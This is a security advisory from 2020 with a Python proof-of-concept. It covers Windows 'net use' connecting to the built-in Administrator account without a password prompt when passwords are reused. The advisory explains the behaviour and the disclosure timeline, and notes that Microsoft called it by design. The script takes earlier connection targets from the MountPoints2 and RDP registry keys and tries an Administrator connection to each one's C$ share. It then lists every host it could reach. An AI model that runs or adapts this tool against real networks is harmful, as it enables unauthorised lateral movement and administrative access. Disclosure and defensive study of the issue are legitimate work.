@@ -1,0 +1,313 @@
+# Title: Microsoft NET USE win10 - Insufficient Authentication Logic
+# Date: 2020-04-04
+# Author: hyp3rlinx
+# Vendor: www.microsoft.com
+# CVE: N/A
+
+
+[+] Credits: John Page (aka hyp3rlinx)		
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/MICROSOFT-WINDOWS-NET-USE-INSUFFICIENT-PASSWORD-PROMPT.txt
+[+] twitter.com/hyp3rlinx
+[+] ISR: ApparitionSec
+
+
+[Vendor]
+www.microsoft.com
+
+
+[Product]
+Windows "net use" Command
+
+Connects a computer to or disconnects a computer from a shared resource, or displays information about computer connections.
+The command also controls persistent net connections. Used without parameters, net use retrieves a list of network connections.
+
+
+[Vulnerability Type]
+Insuffient Password Prompt
+
+
+[CVE Reference]
+N/A
+
+
+[Security Issue]
+The Windows "net use" network logon type-3 command does not prompt for authentication when the built-in Administrator account
+is enabled and both remote and originating systems suffer from password reuse. This also works as "standard" user but unfortunately
+we do not gain high integrity privileges. However, it opens the door and increases the attack surface if the box we laterally move to
+has other vulnerabilities present.
+
+In contrast authenticating using the "unc path" "\\x.x.x.x\c$" using an explorer type logon does prompt for credentials as expected.
+The authentication mechanism between the two network logon methods are inconsistent and in my opinion leaves an authentication loophole invitation.
+Moreover, since this targets built-in Administrator account, one would think there would be more or equal security measures in place not less.
+
+Requirements:
+1) Remote system built-in Administrator account is enabled
+2) Origination system users account password and the remote system Administrator passwords match (reuse).
+
+Typically, to gain Admin privileges on remote logon you may have to create and enable "LocalAccountTokenFilterPolicy" but NOT in this case.
+Again, the "LocalAccountTokenFilterPolicy" registry setting does NOT need to exist and is NOT enabled and has no bearing on the issue.
+
+However, if "FilterAdministratorToken" is enabled in registry on the remote system then the above loophole scenario fails.
+Interestingly, the "FilterAdministratorToken" setting does not seem to exist by default in the Windows registry.
+
+Therefore, if an attacker pops a box they can check "MountPoints2" registry values usually used by forensic analysts for previous network connections
+and try them and if theres password reuse (likely) BOOM automagic logon.
+
+This vuln occurs due to an inconsistent password dialog prompting and whether the "net use" logon method is used.
+When testing make sure to logout then log back in after changing passwords so the environment is clean.
+
+e.g.
+
+1) Passwords for both systems are different and remote built-in Administrator account active:
+
+C:\sec>net use z: \\192.168.x.x\c$ /user:Administrator
+
+Enter the password for 'Administrator' to connect to '192.168.x.x':
+System error 5 has occurred.
+
+Access is denied.
+
+2) Passwords for both origination system and remote match:
+
+C:\sec>net use z: \\192.168.x.x\c$ /user:Administrator
+The command completed successfully.
+
+By the way as a side note DCERPC calls work as well, if both systems happen to have same password.
+c:\>getmac /s x.x.x.x /U Administrator
+
+MSRC in their response, pointed out that "No login prompt on remote connection if both Administrator password are the same."
+Ok, but why does "net use" not follow the same pattern as doing a UNC-Path type of logon, where we get the expected cred dialog box?
+
+Expected result: Consistent password dialog box, no matter if passwords match or not.
+Actual Result: No prompt for a password if both systems passwords are the same.
+
+Tested successfully on fully patched Windows 10 using VM, also across LAN to a non-domain connected PC.
+
+
+[Exploit/POC]
+import os,re,time,signal,sys
+from subprocess import *
+from multiprocessing import Process
+
+#By John Page (aka hyp3rlinx)
+#Apparition Security
+#twitter.com/hyp3rlinx
+#-----------------------------------
+#When a remote systems built-in Administrator account is enabled and both the remote and the target system
+#passwords match (password reuse) theres no prompt for credentials and we get logged in automagically.
+#
+#MountPoints2 and Terminal server client hints in the Windows registry can help us.
+#Typically, MountPoints2 is used by Forensic analysts to help determine where an attacker laterally moved to previously.
+#REG Query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2 /F "##" (we want network logons)
+#MountPoints2 key entries are stored like '##10.2.1.40#c$'
+#-----------------------------------------------------------
+
+BANNER="""
+    _   ______________   ___    ____  __  _______ ______
+   / | / / ____/_  __/  /   |  / __ )/ / / / ___// ____/
+  /  |/ / __/   / /    / /| | / __  / / / /\__ \/ __/   
+ / /|  / /___  / /    / ___ |/ /_/ / /_/ /___/ / /___   
+/_/ |_/_____/ /_/    /_/  |_/_____/\____//____/_____/   
+
+                                          By Hyp3rlinx
+                                          ApparitionSec
+"""
+
+DRIVE="X"
+FINDME="The command completed successfully."
+REG_MOUNT2='REG Query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2 /F "##"'
+REG_RDPUSERS="REG Query \"HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers\""+" /s"
+VULN_FOUND=set()
+DELAY=2   #Any lower and we may get inaccurate results.
+rdp_server_lst=[]
+
+#Return prior network logons to remote systems.
+def mountpoints2():
+    mntpoint2_connections=[]
+    try:
+        p = Popen(REG_MOUNT2, stdout=PIPE, stderr=PIPE, shell=True)
+        tmp = p.stdout.readlines()
+    except Exception as e:
+        print("[!] "+str(e))
+        return False
+    for x in tmp:
+        idx = x.find("##")
+        clean = x[idx:]
+        idx2 = clean.rfind("#")
+        ip = clean[2:idx2]
+        ip = re.sub(r"#.*[A-Z,a-z]","",ip)
+        if ip not in mntpoint2_connections:
+            mntpoint2_connections.append(ip)
+        mntpoint2_connections = list(filter(None, mntpoint2_connections))
+    p.kill()
+    return mntpoint2_connections
+
+ 
+#Terminal server client stores remote server connections.
+def rdp_svrs():
+    global rdp_server_lst
+    try:
+        p = Popen(REG_RDPUSERS, stdout=PIPE, stderr=PIPE, shell=True)
+        tmp = p.stdout.readlines()
+        for key in tmp:
+            if key.find("Servers")!=-1:
+                pos = key.rfind("\\")
+                srv = key[pos + 1:].replace("\r\n","").strip()
+                rdp_server_lst.append(srv)
+        p.kill()
+    except Exception as e:
+        print("[!] "+str(e))
+        return False
+    return True
+
+
+#Disconnect
+def del_vuln_connection(ip):
+    try:
+        print("[!] Disconnecting vuln network logon connection.\n")
+        call(r"net use "+DRIVE+":"+" /del")
+    except Exception as e:
+        print("[!] "+str(e))
+
+
+#Check connection
+def chk_connection(ip):
+    print("[+] Testing: "+ip)
+    sys.stdout.flush()
+    cmd = Popen(['ping.exe', ip, "-n", "1"], stderr=PIPE, stdout=PIPE, shell=True)
+    stderr, stdout = cmd.communicate()
+    if "Reply from" in stderr and "Destination host unreachable" not in stderr:
+        print("[*] Target up!")
+        return True
+    else:
+        print("[!] Target unreachable :(")
+    return False
+
+ 
+#Test vuln
+def Test_Password_Reuse(ip):
+    print("[+] Testing "+ip + " the builtin Administrator account.\n")
+    sys.stdout.flush()
+    try:
+        p = Popen("net use X: \\\\"+ip+"\\c$ /user:Administrator", stdout=PIPE, stderr=PIPE, shell=True)
+        err = p.stderr.readlines()
+    
+        if err:
+            e = str(err)
+            if e.find("error 53")!=-1:
+                print("[*] Network path not found\n")
+                return
+            elif e.find("error 1219")!=-1:
+                print("[*] Target connections to a server or shared resource by the same user, using more than one user name are disallowed.\n")
+                return
+            elif e.find("error 85")!=-1:
+                print("[*] The local device name is already in use.\n")
+                return
+            else:
+                print(e+"\n")
+                
+        tmp = p.stdout.read()
+
+        if FINDME in tmp:
+            print("[*] Password reuse for the built-in Administrator found!")
+            print("[+] Connected to target: "+ ip)
+            VULN_FOUND.add(ip+":Administrator")
+            del_vuln_connection(ip)
+        p.kill()
+    except Exception as e:
+        print("[!] "+str(e))
+
+
+
+#Authenticate
+def auth(ip):
+    action_process = Process(target=Test_Password_Reuse, args=(ip,))
+    action_process.start()
+    action_process.join(timeout=5)
+    action_process.terminate()
+
+
+if __name__ == "__main__":
+
+    print(BANNER)
+    print("[+] Windows 'net use' Network Logon Type-3")
+    print("[+] Insufficient Password Prompt")
+    print("[+] By hyp3rlinx\n")
+    
+    time.sleep(3)
+    
+    print("[+] Deleting any existing network logons to start clean.")
+    
+    #Make sure no exist sessions already exist.
+    call(r"net use * /del /y")
+    sys.stdout.flush()
+    time.sleep(1)
+
+    
+    #Grab previous connections from MountPoints2 if any.
+    rdp_svrs()
+    svrlst=mountpoints2()
+
+    if svrlst:
+        svrlst + rdp_server_lst
+    else:
+        svrlst = rdp_server_lst
+    
+    if not svrlst:
+        print("[*] No MountPoints2 artifacts found, enter an IP.")
+        sys.stdout.flush()
+        ip=raw_input("[+] Target IP> ")
+        if chk_connection(ip):
+             auth(ip)
+    else:
+        #We have MountPoints2 or RDP Server list IP we can try.
+        for ip in svrlst:
+            if chk_connection(ip):
+                 auth(ip)
+                 
+            time.sleep(DELAY)
+ 
+
+    if len(VULN_FOUND) != 0:
+        print("[*] Located the following vulnerable systems:")
+        sys.stdout.flush()
+        for v in VULN_FOUND:
+            print("[+] "+v)
+    else:
+        print("[+] All previous attempts failed, enter an IP and give it a shot!.")
+        sys.stdout.flush()
+        ip=raw_input("[+] Target IP> ")
+        if chk_connection(ip):
+             auth(ip)
+
+
+
+[POC Video URL]
+https://www.youtube.com/watch?v=Je93Neb0k8g
+
+
+[Network Access]
+Remote
+
+
+[Severity]
+High
+
+
+[Disclosure Timeline]
+Vendor Notification: February 28, 2020
+MSRC "behavior you are reporting is by design" : March 30, 2020
+April 5, 2020 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
